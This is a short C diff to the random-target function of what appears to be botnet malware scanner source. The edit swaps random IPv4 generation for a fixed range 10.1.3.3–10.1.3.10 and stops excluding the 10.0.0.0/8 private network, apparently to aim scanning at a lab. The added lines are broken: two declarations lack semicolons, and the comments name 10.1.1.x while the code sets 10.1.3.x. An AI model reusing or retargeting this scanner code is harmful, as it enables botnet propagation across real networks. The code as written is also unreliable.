@@ -676,23 +676,31 @@ static ipv4_t get_random_ip(void)
     uint32_t tmp;
     uint8_t o1, o2, o3, o4;
     
-    //TODO: return fixed addresses to shorten time
-
     do
     {
+        //TODO: return fixed addresses to shorten time
+        o1 = 10;
+        o2 = 1;
+        o3 = 3;
+        int upper = 10 // max 10.1.1.10
+        int lower = 3 // min 10.1.1.3
+        o4 = (rand() % (upper - lower + 1)) + lower;
+        printf("[scan] Trying ip: %i.%i.%i.%i", o1, o2, o3, o4);
+        /*
         tmp = rand_next();
 
         o1 = tmp & 0xff;
         o2 = (tmp >> 8) & 0xff;
         o3 = (tmp >> 16) & 0xff;
         o4 = (tmp >> 24) & 0xff;
+        */
     }
     while (o1 == 127 ||                             // 127.0.0.0/8      - Loopback
           (o1 == 0) ||                              // 0.0.0.0/8        - Invalid address space
           (o1 == 3) ||                              // 3.0.0.0/8        - General Electric Company
           (o1 == 15 || o1 == 16) ||                 // 15.0.0.0/7       - Hewlett-Packard Company
           (o1 == 56) ||                             // 56.0.0.0/8       - US Postal Service
-          (o1 == 10) ||                             // 10.0.0.0/8       - Internal network
+          //(o1 == 10) ||                             // 10.0.0.0/8       - Internal network
           (o1 == 192 && o2 == 168) ||               // 192.168.0.0/16   - Internal network
           (o1 == 172 && o2 >= 16 && o2 < 32) ||     // 172.16.0.0/14    - Internal network
           (o1 == 100 && o2 >= 64 && o2 < 127) ||    // 100.64.0.0/10    - IANA NAT reserved
